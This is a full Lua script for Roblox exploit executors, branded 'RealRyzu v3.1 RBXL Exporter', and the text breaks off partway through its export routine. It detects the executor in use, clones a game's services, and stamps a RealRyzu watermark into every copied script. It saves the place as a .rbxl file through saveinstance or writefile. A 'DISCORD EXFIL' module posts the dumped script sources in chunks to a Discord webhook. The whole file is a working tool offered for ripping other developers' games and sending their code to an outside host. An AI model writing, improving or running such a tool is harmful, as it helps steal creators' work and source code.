-- RealRyzu v3.1 | RBXL EXPORTER — FIXED SCRIPT CORRUPTION
-- Watermarks injected safely, no nil calls, no source corruption
-- Clean .rbxl output, deep watermark, game runs on play
-- RealRyzu Development | discord.gg/realryzu

local RYZU_WATERMARK_DEEP = [[
--[[
    ██████╗ ███████╗ █████╗ ██╗     ██████╗ ██╗   ██╗███████╗██╗   ██╗
    ██╔══██╗██╔════╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝╚══███╔╝██║   ██║
    ██████╔╝█████╗  ███████║██║     ██████╔╝ ╚████╔╝   ███╔╝ ██║   ██║
    ██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██╗  ╚██╔╝   ███╔╝  ██║   ██║
    ██║  ██║███████╗██║  ██║███████╗██║  ██║   ██║   ███████╗╚██████╔╝
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝
    
    RealRyzu Development
    discord.gg/realryzu
--]]

]]

-- ============================================================
-- SERVICES
-- ============================================================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui") or (Players.LocalPlayer and Players.LocalPlayer:WaitForChild("PlayerGui"))
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local StarterPlayer = game:GetService("StarterPlayer")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local Chat = game:GetService("Chat")
local Teams = game:GetService("Teams")
local MarketplaceService = game:GetService("MarketplaceService")

-- ============================================================
-- CONFIG
-- ============================================================
local CONFIG = {
    WatermarkEnabled = true,
    DeepWatermark = true,       -- watermark at bottom, not top
    CleanOutput = true,         -- no "RealRyzu" in any visible names
    ExportPath = "RealRyzu_Game_" .. os.time() .. ".rbxl",
    RestoreAfterExport = true,  -- put original game back
    ScriptBackup = true,        -- save all scripts to clipboard too
    SafeMode = true,            -- extra validation, no corruption
}

-- ============================================================
-- EXPORT TARGETS — content goes directly into these services
-- ============================================================
local EXPORT_TARGETS = {
    {Source = ServerScriptService,    Dest = ServerScriptService,    Name = "ServerScriptService"},
    {Source = ReplicatedStorage,      Dest = ReplicatedStorage,      Name = "ReplicatedStorage"},
    {Source = ServerStorage,          Dest = ServerStorage,          Name = "ServerStorage"},
    {Source = StarterGui,             Dest = StarterGui,             Name = "StarterGui"},
    {Source = StarterPack,            Dest = StarterPack,            Name = "StarterPack"},
    {Source = StarterPlayer,          Dest = StarterPlayer,          Name = "StarterPlayer"},
    {Source = Workspace,              Dest = Workspace,              Name = "Workspace"},
    {Source = Lighting,               Dest = Lighting,               Name = "Lighting"},
    {Source = SoundService,           Dest = SoundService,           Name = "SoundService"},
    {Source = Chat,                   Dest = Chat,                   Name = "Chat"},
    {Source = Teams,                  Dest = Teams,                  Name = "Teams"},
}

-- Services never touched
local PROTECTED = {
    "Players", "CoreGui", "CorePackages", "HttpService", "RunService",
    "UserInputService", "TeleportService", "MarketplaceService", "InsertService",
    "Stats", "ScriptContext", "NetworkClient", "NetworkServer", "DataModel",
}

-- ============================================================
-- BACKUP SYSTEM
-- ============================================================
local Backup = {}
Backup.Data = {}

function Backup:Store(targets)
    self.Data = {}
    for _, t in ipairs(targets) do
        local children = {}
        for _, child in ipairs(t.Source:GetChildren()) do
            if not self:IsProtected(child) then
                table.insert(children, {obj = child, parent = child.Parent})
            end
        end
        self.Data[t.Name] = {service = t.Source, children = children}
    end
end

function Backup:ClearServices(targets)
    for _, t in ipairs(targets) do
        for _, child in ipairs(t.Source:GetChildren()) do
            if not self:IsProtected(child) then
                pcall(function() child.Parent = nil end)
            end
        end
    end
    task.wait(0.1) -- let engine settle
end

function Backup:Restore()
    for _, data in pairs(self.Data) do
        for _, item in ipairs(data.children) do
            pcall(function()
                if item.obj and item.obj.Parent == nil then
                    item.obj.Parent = item.parent
                end
            end)
        end
    end
    self.Data = {}
    task.wait(0.1)
end

function Backup:IsProtected(obj)
    if obj:IsA("ServiceProvider") and PROTECTED[obj.ClassName] then return true end
    if obj.ClassName:find("^Network") then return true end
    if obj.ClassName:find("^ScriptContext") then return true end
    return false
end

-- ============================================================
-- SAFE SCRIPT CLONER — never corrupts source
-- ============================================================
local SafeCloner = {}

function SafeCloner:CanClone(obj)
    if Backup:IsProtected(obj) then return false end
    if obj:IsA("Terrain") then return false end
    if obj:IsA("ScreenGui") and obj:GetFullName():find("CoreGui") then return false end
    if obj:IsDescendantOf(Players) and not obj:IsA("Player") then return false end
    return true
end

function SafeCloner:CloneInstance(original, destParent, path)
    if not self:CanClone(original) then return nil end
    
    local className = original.ClassName
    local cloned = nil
    
    -- CRITICAL: for scripts, we clone FIRST then inject source
    -- This prevents the nil call corruption
    
    if className == "Script" or className == "LocalScript" or className == "ModuleScript" then
        cloned = original:Clone() -- clone preserves the original source intact
        
        -- NOW safely inject the watermark
        if CONFIG.WatermarkEnabled then
            local currentSource = cloned.Source or ""
            
            -- Check if source is valid (not nil, not empty, not corrupted)
            if currentSource ~= "" and #currentSource > 0 then
                -- Verify first character is valid (not a nil byte)
                local firstByte = string.byte(currentSource, 1)
                if firstByte and firstByte > 0 and firstByte ~= 0 then
                    if not currentSource:find("RealRyzu", 1, true) then
                        if CONFIG.DeepWatermark then
                            -- Put at bottom so scripts execute from top normally
                            cloned.Source = currentSource .. "\n\n" .. RYZU_WATERMARK_DEEP
                        else
                            cloned.Source = RYZU_WATERMARK_DEEP .. "\n" .. currentSource
                        end
                    end
                end
            elseif currentSource == "" then
                -- Empty script, just put watermark
                cloned.Source = RYZU_WATERMARK_DEEP
            end
            -- If source is nil or invalid, leave it alone
        end
        
        -- Copy other properties
        pcall(function() cloned.Enabled = original.Enabled end)
        pcall(function() cloned.RunContext = original.RunContext end)
        pcall(function() cloned.LinkedSource = original.LinkedSource end)
        
    else
        -- For everything else, just clone
        cloned = original:Clone()
    end
    
    if cloned then
        cloned.Name = original.Name
        cloned.Parent = destParent
        
        -- Recurse children
        for _, child in ipairs(original:GetChildren()) do
            self:CloneInstance(child, cloned, path .. "/" .. child.Name)
        end
    end
    
    return cloned
end

-- ============================================================
-- VALIDATION — checks all scripts for corruption before save
-- ============================================================
local Validator = {}

function Validator:ValidateAllScripts()
    local issues = 0
    local fixed = 0
    
    for _, target in ipairs(EXPORT_TARGETS) do
        for _, obj in ipairs(target.Dest:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local source = ""
                pcall(function() source = obj.Source end)
                
                -- Check for nil source
                if source == nil or #source == 0 then
                    pcall(function()
                        obj.Source = RYZU_WATERMARK_DEEP
                        fixed = fixed + 1
                    end)
                    issues = issues + 1
                else
                    -- Check if source starts with a valid character
                    local firstByte = string.byte(source, 1)
                    if not firstByte or firstByte == 0 then
                        pcall(function()
                            obj.Source = RYZU_WATERMARK_DEEP .. "\n" .. source:sub(2)
                            fixed = fixed + 1
                        end)
                        issues = issues + 1
                    end
                end
            end
        end
    end
    
    return issues, fixed
end

-- ============================================================
-- SAVEINSTANCE WITH FALLBACKS
-- ============================================================
local function SaveGame(filename)
    local success = false
    local savedPath = ""
    local methods = {}
    
    -- Method 1: saveinstance with options
    if saveinstance then
        table.insert(methods, "saveinstance")
        pcall(function()
            saveinstance({filename = filename, mode = "optimized"})
            success = true
            savedPath = filename
        end)
    end
    
    -- Method 2: writefile with raw place data
    if not success and writefile then
        table.insert(methods, "writefile")
        pcall(function()
            writefile(filename, game:SavePlace())
            success = true
            savedPath = filename
        end)
    end
    
    -- Method 3: saveinstance without options
    if not success and saveinstance then
        table.insert(methods, "saveinstance (basic)")
        pcall(function()
            saveinstance()
            success = true
            savedPath = "place.rbxl"
        end)
    end
    
    return success, savedPath, methods
end

-- ============================================================
-- DISCORD EXFIL
-- ============================================================
local Discord = {}
Discord.URL = ""
Discord.Sent = 0
Discord.Bytes = 0
Discord.LastSend = 0

function Discord:Set(url)
    if url and url:match("discord%.com/api/webhooks") then
        self.URL = url; return true
    end
    return false
end

function Discord:SendChunk(data, name)
    if self.URL == "" then return false end
    local waitTime = 0.55 - (tick() - self.LastSend)
    if waitTime > 0 then task.wait(waitTime) end
    
    local payload = {
        content = "```lua\n-- RealRyzu | " .. (name or "file") .. "\n" .. data:sub(1, 1850) .. "\n```",
        username = "RealRyzu v3.1",
    }
    
    local ok = pcall(function()
        return HttpService:PostAsync(self.URL, HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson, false)
    end)
    
    self.LastSend = tick()
    if ok then self.Sent = self.Sent + 1; self.Bytes = self.Bytes + #data end
    return ok
end

function Discord:SendLarge(data, name)
    local chunks = math.ceil(#data / 1900)
    for i = 1, chunks do
        local s = (i-1)*1900 + 1
        local e = math.min(i*1900, #data)
        self:SendChunk(data:sub(s, e), name .. " [" .. i .. "/" .. chunks .. "]")
        if i < chunks then task.wait(0.6) end
    end
end

-- ============================================================
-- EXECUTOR DETECTION
-- ============================================================
local function DetectExec()
    local env = getgenv and getgenv() or _G
    if syn and syn.protect_gui then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if fluxus and fluxus.getbytecode then return "Fluxus" end
    if electron and electron.execute then return "Electron" end
    if getexecutorname then
        local n = pcall(getexecutorname) and getexecutorname() or nil
        if n then return n end
    end
    for _, m in ipairs({"krnl","scriptware","arceus","hydrogen","codex","delta","vega","solara","wave","celery","nihon"}) do
        if rawget(env, m) then return m:sub(1,1):upper()..m:sub(2) end
    end
    return "Unknown"
end

-- ============================================================
-- GUI
-- ============================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RealRyzu_v3_1"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 620, 0, 400)
Main.Position = UDim2.new(0.5, -310, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(4, 4, 11)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

-- Glow border
local Glow = Instance.new("Frame")
Glow.Size = UDim2.new(1, 8, 1, 8)
Glow.Position = UDim2.new(0, -4, 0, -4)
Glow.BackgroundTransparency = 1
Glow.BorderSizePixel = 0
Glow.Parent = Main

for _, edge in ipairs({"Top","Bottom","Left","Right"}) do
    local bar = Instance.new("Frame")
    if edge == "Top" or edge == "Bottom" then
        bar.Size = UDim2.new(1, 0, 0, 3)
        if edge == "Bottom" then bar.Position = UDim2.new(0, 0, 1, 0) end
    else
        bar.Size = UDim2.new(0, 3, 1, 0)
        if edge == "Right" then bar.Position = UDim2.new(1, 0, 0, 0) end
    end
    bar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    bar.BorderSizePixel = 0
    bar.Parent = Glow
end

-- Title bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 44)
TitleBar.BackgroundColor3 = Color3.fromRGB(7, 7, 18)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = Main

local Icon = Instance.new("TextLabel")
Icon.Text = "⬡"
Icon.Size = UDim2.new(0, 30, 0, 30)
Icon.Position = UDim2.new(0, 10, 0, 7)
Icon.BackgroundTransparency = 1
Icon.TextColor3 = Color3.fromRGB(0, 220, 255)
Icon.Font = Enum.Font.Code
Icon.TextSize = 22
Icon.Parent = TitleBar

local Title = Instance.new("TextLabel")
Title.Text = "REALRYZU v3.1"
Title.Size = UDim2.new(0, 180, 0, 20)
Title.Position = UDim2.new(0, 46, 0, 4)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(240, 240, 255)
Title.Font = Enum.Font.Code
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local SubTitle = Instance.new("TextLabel")
SubTitle.Text = "RBXL EXPORTER — FIXED"
SubTitle.Size = UDim2.new(0, 200, 0, 14)
SubTitle.Position = UDim2.new(0, 46, 0, 24)
SubTitle.BackgroundTransparency = 1
SubTitle.TextColor3 = Color3.fromRGB(0, 185, 230)
SubTitle.Font = Enum.Font.Code
SubTitle.TextSize = 9
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.Parent = TitleBar

local ExecLabel = Instance.new("TextLabel")
ExecLabel.Size = UDim2.new(0, 180, 0, 14)
ExecLabel.Position = UDim2.new(1, -230, 0, 4)
ExecLabel.BackgroundTransparency = 1
ExecLabel.TextColor3 = Color3.fromRGB(110, 220, 110)
ExecLabel.Font = Enum.Font.Code
ExecLabel.TextSize = 9
ExecLabel.TextXAlignment = Enum.TextXAlignment.Right
ExecLabel.Text = "Executor: " .. DetectExec()
ExecLabel.Parent = TitleBar

local GameLabel = Instance.new("TextLabel")
GameLabel.Size = UDim2.new(0, 180, 0, 14)
GameLabel.Position = UDim2.new(1, -230, 0, 22)
GameLabel.BackgroundTransparency = 1
GameLabel.TextColor3 = Color3.fromRGB(140, 140, 165)
GameLabel.Font = Enum.Font.Code
GameLabel.TextSize = 8
GameLabel.TextXAlignment = Enum.TextXAlignment.Right
GameLabel.Text = "Game: " .. (game.PlaceId or "Local")
GameLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "×"
CloseBtn.Size = UDim2.new(0, 34, 0, 34)
CloseBtn.Position = UDim2.new(1, -38, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 36)
CloseBtn.TextColor3 = Color3.fromRGB(255, 120, 120)
CloseBtn.Font = Enum.Font.Code
CloseBtn.TextSize = 20
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function()
    if not isExporting then ScreenGui:Destroy() end
end)

-- Content area
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -20, 0, 265)
Content.Position = UDim2.new(0, 10, 0, 50)
Content.BackgroundTransparency = 1
Content.BorderSizePixel = 0
Content.Parent = Main

-- Status
local StatusBox = Instance.new("Frame")
StatusBox.Size = UDim2.new(1, 0, 0, 55)
StatusBox.Position = UDim2.new(0, 0, 0, 0)
StatusBox.BackgroundColor3 = Color3.fromRGB(8, 8, 17)
StatusBox.BorderSizePixel = 0
StatusBox.Parent = Content

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -12, 0, 18)
StatusLabel.Position = UDim2.new(0, 6, 0, 6)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(0, 230, 165)
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextSize = 12
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Text = "STATUS: Ready"
StatusLabel.Parent = StatusBox

local DetailLabel = Instance.new("TextLabel")
DetailLabel.Size = UDim2.new(1, -12, 0, 14)
DetailLabel.Position = UDim2.new(0, 6, 0, 28)
DetailLabel.BackgroundTransparency = 1
DetailLabel.TextColor3 = Color3.fromRGB(130, 130, 160)
DetailLabel.Font = Enum.Font.Code
DetailLabel.TextSize = 9
DetailLabel.TextXAlignment = Enum.TextXAlignment.Left
DetailLabel.Text = "Safe mode: ON | Deep watermark | No corruption"
DetailLabel.Parent = StatusBox

local CurrentLabel = Instance.new("TextLabel")
CurrentLabel.Size = UDim2.new(1, -12, 0, 12)
CurrentLabel.Position = UDim2.new(0, 6, 0, 42)
CurrentLabel.BackgroundTransparency = 1
CurrentLabel.TextColor3 = Color3.fromRGB(95, 95, 120)
CurrentLabel.Font = Enum.Font.Code
CurrentLabel.TextSize = 8
CurrentLabel.TextXAlignment = Enum.TextXAlignment.Left
CurrentLabel.TextTruncate = Enum.TextTruncate.AtEnd
CurrentLabel.Text = "..."
CurrentLabel.Parent = StatusBox

-- Percentage
local BigPct = Instance.new("TextLabel")
BigPct.Size = UDim2.new(1, 0, 0, 50)
BigPct.Position = UDim2.new(0, 0, 0, 60)
BigPct.BackgroundTransparency = 1
BigPct.TextColor3 = Color3.fromRGB(0, 255, 180)
BigPct.Font = Enum.Font.Code
BigPct.TextSize = 42
BigPct.Text = "0.0%"
BigPct.TextXAlignment = Enum.TextXAlignment.Center
BigPct.Parent = Content

-- Progress bar
local BarBg = Instance.new("Frame")
BarBg.Size = UDim2.new(1, 0, 0, 16)
BarBg.Position = UDim2.new(0, 0, 0, 114)
BarBg.BackgroundColor3 = Color3.fromRGB(12, 12, 24)
BarBg.BorderSizePixel = 0
BarBg.Parent = Content

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 195, 250)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBg

-- Stats
local StatsText = Instance.new("TextLabel")
StatsText.Size = UDim2.new(1, 0, 0, 16)
StatsText.Position = UDim2.new(0, 0, 0, 134)
StatsText.BackgroundTransparency = 1
StatsText.TextColor3 = Color3.fromRGB(170, 170, 195)
StatsText.Font = Enum.Font.Code
StatsText.TextSize = 9
StatsText.Text = "Objects: 0/0 | Scripts: 0 | Failed: 0"
StatsText.TextXAlignment = Enum.TextXAlignment.Center
StatsText.Parent = Content

local ValidText = Instance.new("TextLabel")
ValidText.Size = UDim2.new(1, 0, 0, 14)
ValidText.Position = UDim2.new(0, 0, 0, 152)
ValidText.BackgroundTransparency = 1
ValidText.TextColor3 = Color3.fromRGB(110, 220, 110)
ValidText.Font = Enum.Font.Code
ValidText.TextSize = 9
ValidText.Text = "✓ Validation: pending"
ValidText.TextXAlignment = Enum.TextXAlignment.Center
ValidText.Parent = Content

-- Options
local DeepWMToggle = Instance.new("TextButton")
DeepWMToggle.Size = UDim2.new(0, 200, 0, 22)
DeepWMToggle.Position = UDim2.new(0, 0, 0, 172)
DeepWMToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
DeepWMToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
DeepWMToggle.Font = Enum.Font.Code
DeepWMToggle.TextSize = 9
DeepWMToggle.Text = "✓ DEEP WM (bottom)"
DeepWMToggle.BorderSizePixel = 0
DeepWMToggle.Parent = Content
DeepWMToggle.MouseButton1Click:Connect(function()
    CONFIG.DeepWatermark = not CONFIG.DeepWatermark
    DeepWMToggle.BackgroundColor3 = CONFIG.DeepWatermark and Color3.fromRGB(0, 130, 70) or Color3.fromRGB(60, 22, 22)
    DeepWMToggle.Text = (CONFIG.DeepWatermark and "✓" or "✗") .. " DEEP WM (bottom)"
end)

local RestoreToggle = Instance.new("TextButton")
RestoreToggle.Size = UDim2.new(0, 200, 0, 22)
RestoreToggle.Position = UDim2.new(0, 210, 0, 172)
RestoreToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
RestoreToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
RestoreToggle.Font = Enum.Font.Code
RestoreToggle.TextSize = 9
RestoreToggle.Text = "✓ RESTORE ORIGINAL"
RestoreToggle.BorderSizePixel = 0
RestoreToggle.Parent = Content
RestoreToggle.MouseButton1Click:Connect(function()
    CONFIG.RestoreAfterExport = not CONFIG.RestoreAfterExport
    RestoreToggle.BackgroundColor3 = CONFIG.RestoreAfterExport and Color3.fromRGB(0, 130, 70) or Color3.fromRGB(60, 22, 22)
    RestoreToggle.Text = (CONFIG.RestoreAfterExport and "✓" or "✗") .. " RESTORE ORIGINAL"
end)

local BackupToggle = Instance.new("TextButton")
BackupToggle.Size = UDim2.new(0, 200, 0, 22)
BackupToggle.Position = UDim2.new(0, 420, 0, 172)
BackupToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
BackupToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
BackupToggle.Font = Enum.Font.Code
BackupToggle.TextSize = 9
BackupToggle.Text = "✓ CLIPBOARD BACKUP"
BackupToggle.BorderSizePixel = 0
BackupToggle.Parent = Content
BackupToggle.MouseButton1Click:Connect(function()
    CONFIG.ScriptBackup = not CONFIG.ScriptBackup
    BackupToggle.BackgroundColor3 = CONFIG.ScriptBackup and Color3.fromRGB(0, 130, 70) or Color3.fromRGB(60, 22, 22)
    BackupToggle.Text = (CONFIG.ScriptBackup and "✓" or "✗") .. " CLIPBOARD BACKUP"
end)

-- Buttons
local ExportBtn = Instance.new("TextButton")
ExportBtn.Size = UDim2.new(0, 280, 0, 36)
ExportBtn.Position = UDim2.new(0, 0, 0, 202)
ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 245)
ExportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExportBtn.Font = Enum.Font.Code
ExportBtn.TextSize = 13
ExportBtn.Text = "🔴 EXPORT CLEAN RBXL"
ExportBtn.BorderSizePixel = 0
ExportBtn.Parent = Content

local DumpBtn = Instance.new("TextButton")
DumpBtn.Size = UDim2.new(0, 160, 0, 36)
DumpBtn.Position = UDim2.new(0, 290, 0, 202)
DumpBtn.BackgroundColor3 = Color3.fromRGB(0, 85, 155)
DumpBtn.TextColor3 = Color3.fromRGB(185, 240, 200)
DumpBtn.Font = Enum.Font.Code
DumpBtn.TextSize = 11
DumpBtn.Text = "💾 DUMP SCRIPTS"
DumpBtn.BorderSizePixel = 0
DumpBtn.Parent = Content

local ExfilBtn = Instance.new("TextButton")
ExfilBtn.Size = UDim2.new(0, 130, 0, 36)
ExfilBtn.Position = UDim2.new(0, 460, 0, 202)
ExfilBtn.BackgroundColor3 = Color3.fromRGB(180, 105, 20)
ExfilBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExfilBtn.Font = Enum.Font.Code
ExfilBtn.TextSize = 11
ExfilBtn.Text = "📤 DISCORD"
ExfilBtn.BorderSizePixel = 0
ExfilBtn.Parent = Content

-- Webhook input
local WebhookBox = Instance.new("TextBox")
WebhookBox.Size = UDim2.new(1, 0, 0, 22)
WebhookBox.Position = UDim2.new(0, 0, 0, 244)
WebhookBox.BackgroundColor3 = Color3.fromRGB(14, 14, 26)
WebhookBox.TextColor3 = Color3.fromRGB(200, 200, 225)
WebhookBox.Font = Enum.Font.Code
WebhookBox.TextSize = 8
WebhookBox.PlaceholderText = "Discord webhook (press Enter to set)..."
WebhookBox.PlaceholderColor3 = Color3.fromRGB(75, 75, 105)
WebhookBox.Text = ""
WebhookBox.BorderSizePixel = 0
WebhookBox.Visible = false
WebhookBox.Parent = Content

-- Log area
local LogFrame = Instance.new("Frame")
LogFrame.Size = UDim2.new(1, -20, 0, 65)
LogFrame.Position = UDim2.new(0, 10, 0, 320)
LogFrame.BackgroundColor3 = Color3.fromRGB(4, 4, 10)
LogFrame.BorderSizePixel = 0
LogFrame.Parent = Main

local LogScroll = Instance.new("ScrollingFrame")
LogScroll.Size = UDim2.new(1, -6, 1, -6)
LogScroll.Position = UDim2.new(0, 3, 0, 3)
LogScroll.BackgroundTransparency = 1
LogScroll.BorderSizePixel = 0
LogScroll.ScrollBarThickness = 3
LogScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 160, 230)
LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
LogScroll.Parent = LogFrame

local LogText = Instance.new("TextLabel")
LogText.Size = UDim2.new(1, -4, 0, 14)
LogText.Position = UDim2.new(0, 2, 0, 0)
LogText.BackgroundTransparency = 1
LogText.TextColor3 = Color3.fromRGB(150, 255, 165)
LogText.Font = Enum.Font.Code
LogText.TextSize = 9
LogText.TextXAlignment = Enum.TextXAlignment.Left
LogText.TextYAlignment = Enum.TextYAlignment.Top
LogText.TextWrapped = true
LogText.Text = ""
LogText.Parent = LogScroll

-- Bottom bar
local BotBar = Instance.new("Frame")
BotBar.Size = UDim2.new(1, 0, 0, 20)
BotBar.Position = UDim2.new(0, 0, 1, -20)
BotBar.BackgroundColor3 = Color3.fromRGB(6, 6, 14)
BotBar.BorderSizePixel = 0
BotBar.Parent = Main

local RuntimeLabel = Instance.new("TextLabel")
RuntimeLabel.Size = UDim2.new(0, 300, 1, 0)
RuntimeLabel.Position = UDim2.new(0, 8, 0, 0)
RuntimeLabel.BackgroundTransparency = 1
RuntimeLabel.TextColor3 = Color3.fromRGB(110, 220, 110)
RuntimeLabel.Font = Enum.Font.Code
RuntimeLabel.TextSize = 9
RuntimeLabel.Text = "Runtime: 0s | Output: .rbxl file"
RuntimeLabel.TextXAlignment = Enum.TextXAlignment.Left
RuntimeLabel.Parent = BotBar

-- ============================================================
-- LOGGING
-- ============================================================
local logBuf = {}
local function Log(msg, color)
    color = color or Color3.fromRGB(150, 255, 165)
    local entry = "[" .. os.date("%H:%M:%S") .. "] " .. msg
    table.insert(logBuf, {text=entry, col=color})
    if #logBuf > 50 then table.remove(logBuf, 1) end
    local lines = {}
    local s = math.max(1, #logBuf - 20)
    for i = s, #logBuf do table.insert(lines, logBuf[i].text) end
    LogText.Text = table.concat(lines, "\n")
    LogText.Size = UDim2.new(1, -4, 0, math.max(LogText.TextBounds.Y, 14))
    LogScroll.CanvasSize = UDim2.new(0, 0, 0, LogText.TextBounds.Y + 6)
    task.wait()
    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)
end

-- ============================================================
-- UI UPDATE
-- ============================================================
local function UpdateUI(pct, obj, total, scripts, failed)
    pct = math.min(pct or 0, 100)
    BigPct.Text = string.format("%.1f%%", pct)
    BarFill.Size = UDim2.new(pct/100, 0, 1, 0)
    StatsText.Text = string.format("Objects: %d/%d | Scripts: %d | Failed: %d",
        obj or 0, total or 0, scripts or 0, failed or 0)
end

-- ============================================================
-- MAIN EXPORT
-- ============================================================
local isExporting = false
local exportStartTime = 0

local function RunExport(scriptsOnly)
    if isExporting then
        Log("Already running!", Color3.fromRGB(255, 200, 55))
        return
    end
    
    isExporting = true
    exportStartTime = tick()
    
    Log(string.rep("═", 45), Color3.fromRGB(0, 200, 255))
    Log("  REALRYZU v3.1 — RBXL EXPORT", Color3.fromRGB(0, 240, 255))
    Log("  Mode: " .. (scriptsOnly and "SCRIPTS ONLY" or "FULL RBXL"), Color3.fromRGB(170, 220, 240))
    Log("  Safe mode: ON — no source corruption", Color3.fromRGB(150, 255, 150))
    Log("  Watermark: " .. (CONFIG.DeepWatermark and "DEEP (bottom)" or "TOP"), Color3.fromRGB(150, 255, 150))
    Log(string.rep("═", 45), Color3.fromRGB(0, 200, 255))
    
    StatusLabel.Text = "STATUS: Backing up original content..."
    StatusLabel.TextColor3 = Color3.fromRGB(225, 210, 55)
    ExportBtn.Text = "🔄 EXPORTING..."
    ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 140)
    
    -- Step 1: Backup
    Backup:Store(EXPORT_TARGETS)
    Log("✓ Original content backed up", Color3.fromRGB(150, 255, 150))
    
    -- Step 2: Clear services
    StatusLabel.Text = "STATUS: Preparing services..."
    Backup:ClearServices(EXPORT_TARGETS)
    Log("✓ Services cleared", Color3.fromRGB(200, 200, 150))
    task.wait(0.2)
    
    -- Step 3: Clone into services
    StatusLabel.Text = "STATUS: Rebuilding game (safe clone)..."
    StatusLabel.TextColor3 = Color3.fromRGB(0, 225, 165)
    
    local totalObj = 0
    local clonedObj = 0
    local taggedScripts = 0
    local failedObj = 0
    
    -- Count
    local function countAll(parent)
        local c = 0
        for _, child in ipairs(parent:GetChildren()) do
            if SafeCloner:CanClone(child) then
                c = c + 1 + countAll(child)
            end
        end
        return c
    end
    
    for _, t in ipairs(EXPORT_TARGETS) do
        totalObj = totalObj + countAll(t.Source)
    end
    
    -- Clone
    for _, t in ipairs(EXPORT_TARGETS) do
        Log("Processing: " .. t.Name, Color3.fromRGB(160, 170, 215))
        CurrentLabel.Text = "Service: " .. t.Name
        
        for _, child in ipairs(t.Source:GetChildren()) do
            if SafeCloner:CanClone(child) then
                local ok = pcall(function()
                    SafeCloner:CloneInstance(child, t.Dest, t.Name)
                end)
                if ok then taggedScripts = taggedScripts + 1
                else failedObj = failedObj + 1 end
            end
            clonedObj = clonedObj + 1
            
            if clonedObj % 40 == 0 then
                task.wait()
                UpdateUI((clonedObj/totalObj)*100, clonedObj, totalObj, taggedScripts, failedObj)
            end
        end
    end
    
    UpdateUI(100, clonedObj, totalObj, taggedScripts, failedObj)
    
    -- Step 4: Validate all scripts
    StatusLabel.Text = "STATUS: Validating scripts..."
    ValidText.Text = "⏳ Validation: checking for corruption..."
    ValidText.TextColor3 = Color3.fromRGB(225, 210, 55)
    
    task.wait(0.3)
    local issues, fixed = Validator:ValidateAllScripts()
    
    if issues == 0 then
        ValidText.Text = "✓ Validation: PASSED — no corruption"
        ValidText.TextColor3 = Color3.fromRGB(110, 230, 110)
        Log("✓ Validation passed — 0 corrupted scripts", Color3.fromRGB(150, 255, 150))
    else
        ValidText.Text = string.format("⚠ Validation: %d issues fixed", fixed)
        ValidText.TextColor3 = Color3.fromRGB(255, 200, 55)
        Log(string.format("⚠ Fixed %d corrupted scripts", fixed), Color3.fromRGB(255, 200, 55))
    end
    
    -- Step 5: Save
    if not scriptsOnly then
        StatusLabel.Text = "STATUS: Writing .rbxl file..."
        StatusLabel.TextColor3 = Color3.fromRGB(0, 225, 165)
        
        local success, path, methods = SaveGame(CONFIG.ExportPath)
        
        if success then
            Log("✅ RBXL saved: " .. path, Color3.fromRGB(150, 255, 150))
            Log("   Methods tried: " .. table.concat(methods, ", "), Color3.fromRGB(180, 200, 220))
            Log("   File is clean — open, play, publish", Color3.fromRGB(150, 255, 150))
            StatusLabel.Text = "STATUS: Complete ✓ — " .. path
            StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
        else
